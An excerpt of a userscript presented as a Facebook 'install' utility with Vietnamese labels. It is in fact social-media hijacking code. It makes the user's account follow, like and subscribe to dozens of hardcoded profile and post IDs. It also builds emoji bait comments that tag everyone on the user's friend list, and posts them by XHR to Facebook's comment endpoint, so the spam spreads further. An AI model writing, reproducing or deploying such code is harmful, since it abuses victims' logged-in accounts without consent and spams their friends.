// ==UserScript==
// @name            Cài Ðặt Incoi Facebook  :D ( Ver 1.4.99 )
// @description     All about facebook By Áç Quỷ Çần Yêu1 
...
//Boss Luy tinh
a("100004920762987");
Like("347595802011167");
sublist("231392047034819");
a("100006242293591");
sublist("245693508938006");
Like("441195096008210");
Like("469656976468061");
Like("430333597096684");
//tony vũ
a("100004396688909");
IDS("100004396688909");
a("100005931634666"); 
sublist("224389517717603"); 
Like("590382084374996");
Like("365219486953158");
P("277196639103557");
Like("220839341439779");
IDS("100007300025102");
//chip
a("100004362516938"); 
...
sublist("474846115956730");
sublist("539885622786112");
//tuấn
a("100005657833637");
a("100004957442692");
//Clone Bui
...
mesaj += " Đẹp Quá  🌸  🌷  🌻  🌺  🌴  👮  💅  💀  🎅  🍎  🐔  🐥  🐦  .... Mọi Người Xem Nek  🍂  🐟  💝  👱  Thích Quá 🌟  💚  💙  💔  ☀  ☔  ☁  💋  ✋  💪  <3 @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
...
function yorum_yap(id ,mesaj) {
 ...
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
    ...
    xhr.send(params);
        ...
        arkadaslari_al(1429599747279194);